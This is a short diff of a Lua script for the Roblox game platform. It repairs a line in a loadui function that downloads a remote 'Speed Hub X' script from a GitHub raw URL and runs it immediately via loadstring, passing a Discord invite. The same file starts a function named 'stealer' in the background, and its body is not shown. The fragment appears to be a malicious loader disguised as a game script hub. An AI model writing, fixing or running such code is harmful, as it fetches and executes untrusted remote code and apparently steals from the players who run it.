@@ -3,9 +3,7 @@ local function stealer()
 end
 
 local function loadui()
-    loadstring(game:HttpGet("
-loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
-      ", true))("discord.gg/csxu2nCkw9")
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))("discord.gg/csxu2nCkw9")
 end
 
 task.spawn(stealer)
